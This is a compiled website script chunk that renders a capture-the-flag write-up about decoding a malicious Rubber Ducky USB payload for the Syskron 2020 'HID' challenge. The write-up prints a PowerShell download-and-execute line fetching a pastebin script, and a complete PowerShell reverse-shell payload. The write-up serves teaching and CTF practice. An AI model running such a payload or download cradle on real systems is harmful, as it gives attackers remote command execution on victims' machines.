"use strict";(self.webpackChunkweb_ctf=self.webpackChunkweb_ctf||[]).push([[882],{4917:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>d});var s=n(5893),i=n(1151);const r={},o="HID (300 points)",a={id:"writeups/Syskron/2020/HID",title:"HID (300 points)",description:"Description",source:"@site/docs/writeups/Syskron/2020/HID.md",sourceDirName:"writeups/Syskron/2020",slug:"/writeups/Syskron/2020/HID",permalink:"/<projectName>/docs/writeups/Syskron/2020/HID",draft:!1,unlisted:!1,editUrl:"https://github.com/boyney123/eventcatalog/edit/master/website/docs/writeups/Syskron/2020/HID.md",tags:[],version:"current",lastUpdatedBy:"kostezy",frontMatter:{},sidebar:"writeups",previous:{title:"Steg Ultimate (450 points)",permalink:"/<projectName>/docs/writeups/CyberYoddha/2020/steg_ultimate"},next:{title:"Key generator (300 points)",permalink:"/<projectName>/docs/writeups/Syskron/2020/key_generator"}},c={},d=[{value:"Description",id:"description",level:2},{value:"Solution",id:"solution",level:2}];function l(e){const t=Object.assign({h1:"h1",h2:"h2",p:"p",a:"a",strong:"strong",pre:"pre",code:"code",img:"img"},(0,i.ah)(),e.components);return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"hid-300-points",children:"HID (300 points)"}),"\n",(0,s.jsx)(t.h2,{id:"description",children:"Description"}),"\n",(0,s.jsx)(t.p,{children:"One of my colleagues found a USB stick in the parking lot in front of our company. Fortunately he handed it over directly to us . The drive contains an SD card with just one file. Maybe it's no normal USB flash drive?"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.a,{target:"_blank",href:n(2144).Z+"",children:"Attached bin"})}),"\n",(0,s.jsx)(t.h2,{id:"solution",children:"Solution"}),"\n",(0,s.jsx)(t.p,{children:"Inject.bin found in usb... What could it be? Sure! Ducky scripts!"}),"\n",(0,s.jsxs)(t.p,{children:["Let's google ducky scripts decoder. ",(0,s.jsx)(t.a,{href:"https://ducktoolkit.com/",children:(0,s.jsx)(t.strong,{children:"Here we are"})}),"."]}),"\n",(0,s.jsx)(t.p,{children:"Having decoded the script, I started reading the code. I still don't understand what the code does, but I found an interesting line:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:'powershell "IEX *New/Object Net.WebClient(.DownloadString*~https>&&pastebin.com&raw&YRD8jsvd~(<"ENTER\n'})}),"\n",(0,s.jsxs)(t.p,{children:["Let's open that link to pastebin and get the 404 error :)\n",(0,s.jsx)(t.img,{src:n(7815).Z+"",width:"791",height:"142"})]}),"\n",(0,s.jsx)(t.p,{children:"I decided to search in google cache and Waybackk machine, but this page was not saved anywhere."}),"\n",(0,s.jsx)(t.p,{children:"I tried to run the script in a virtual machine, but the script didn't do anything. Since I did not understand anything in the Daki scripts, I could not change them. I had no ideas and decided to open a hint."}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:"There are different languages for your keyboard layout.\n"})}),"\n",(0,s.jsx)(t.p,{children:"Switzerland was the answer. The link to pastebin has become valid, we open it and see the response with the flag"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{children:'$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10syskronCTF{y0u_f0und_m3}",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n'})}),"\n",(0,s.jsx)(t.p,{children:"Flag: syskronCTF{y0u_f0und_m3}"})]})}const h=function(e={}){const{wrapper:t}=Object.assign({},(0,i.ah)(),e.components);return t?(0,s.jsx)(t,Object.assign({},e,{children:(0,s.jsx)(l,e)})):l(e)}},2144:(e,t,n)=>{n.d(t,{Z:()=>s});const s=n.p+"assets/files/inject-596c8b92e09c36cb19c2c78420cd2e87.bin"},7815:(e,t,n)=>{n.d(t,{Z:()=>s});const s=n.p+"assets/images/XVVlj7ZIvCU-95a06a4f1270afbc8ab9caf37aa3662b.jpg"},1151:(e,t,n)=>{n.d(t,{Zo:()=>a,ah:()=>r});var s=n(7294);const i=s.createContext({});function r(e){const t=s.useContext(i);return s.useMemo((()=>"function"==typeof e?e(t):{...t,...e}),[t,e])}const o={};function a({components:e,children:t,disableParentContext:n}){let a;return a=n?"function"==typeof e?e({}):e||o:r(e),s.createElement(i.Provider,{value:a},t)}}}]);